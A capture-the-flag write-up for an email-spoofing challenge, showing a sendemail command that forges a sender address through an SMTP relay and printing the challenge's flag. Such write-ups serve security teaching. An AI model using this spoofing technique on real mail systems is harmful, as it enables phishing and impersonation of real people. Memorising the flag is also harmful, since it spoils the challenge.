# Onboarding Checklist
Misc

## Challenge 

	From: importantperson@somebigcorp.com
	Date: Feb 22, 2019 9:00 AM
	To: someguy@somebigcorp.com
	Subject: New Employee Access

	Hello Some Guy,

	We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee's email address to tamuctf@gmail.com so they can process the account request?

	Thank you,
	Important Person

	The new employee can be a little slow to respond.

Difficulty: easy

## Solution

For this we need to spoof an email from `someguy@somebigcorp.com`.

We can use emkei.cz to do that. However, I tried it and it is really slow to process.

[To speed things up let's use the `sendemail` command line tool](https://hackingguides.com/send-fake-emails/).

For SMTP server, use your ISP's SMTP server relay

	# apt-get install sendemail

	# MYEMAIL='xxx@gmail.com'
	# SMTP_SERVER='xxx'
	# sendemail 
		-t tamuctf@gmail.com
		-f someguy@somebigcorp.com
		-s $SMTP_SERVER
		-u $MYEMAIL # subject
		-m $MYEMAIL # message
	Feb 24 14:32:10 ubuntu sendemail[59057]: Email was sent successfully!

## Flag

We receive an email shortly after

	tamuctf@gmail.com
	22:33 (4 minutes ago)
	to me

	Hello new employee! Some Guy sent me your email. Here is your key
	gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}
